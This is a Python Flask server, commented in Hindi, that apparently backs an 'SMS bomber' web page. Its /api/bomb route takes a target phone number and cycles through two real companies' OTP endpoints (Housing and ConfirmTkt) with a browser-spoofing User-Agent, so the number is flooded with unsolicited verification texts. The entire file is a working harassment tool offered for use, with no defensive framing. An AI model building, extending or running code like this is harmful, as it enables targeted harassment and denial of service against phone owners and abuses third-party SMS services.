from flask import Flask, request, jsonify, send_from_directory
import requests
import os

app = Flask(__name__, static_folder='../')

@app.route('/')
def index():
    # यह होमपेज (index.html) को लोड करेगा
    return send_from_directory(app.static_folder, 'index.html')

@app.route('/<path:path>')
def static_files(path):
    # यह style.css और script.js को लोड करेगा
    return send_from_directory(app.static_folder, path)

@app.route('/api/bomb')
def bomb():
    target = request.args.get('number')
    idx = int(request.args.get('index', 0))
    
    # केवल 2 सबसे स्टेबल APIs
    apis = [
        {
            "name": "Housing", 
            "method": "POST", 
            "url": "https://login.housing.com/api/v2/send-otp", 
            "json": {"phone": target}
        },
        {
            "name": "ConfirmTkt", 
            "method": "GET", 
            "url": "https://securedapi.confirmtkt.com/api/platform/register", 
            "params": {"newOtp": "true", "mobileNumber": target}
        }
    ]

    api = apis[idx % len(apis)]
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json"
    }

    try:
        # Standard POST (Housing के लिए)
        if api["method"] == "POST":
            res = requests.post(api["url"], json=api["json"], headers=headers, timeout=10)
        
        # Standard GET (ConfirmTkt के लिए)
        else:
            res = requests.get(api["url"], params=api.get("params"), headers=headers, timeout=10)
            
        if res.status_code in [200, 201, 202]:
            return jsonify({"status": "success", "name": api["name"]})
    except: 
        pass
    
    return jsonify({"status": "failed", "name": api["name"]})

if __name__ == '__main__':
    # लोकल टेस्टिंग के लिए port 5000 पर चलेगा
    app.run(host='0.0.0.0', port=5000)
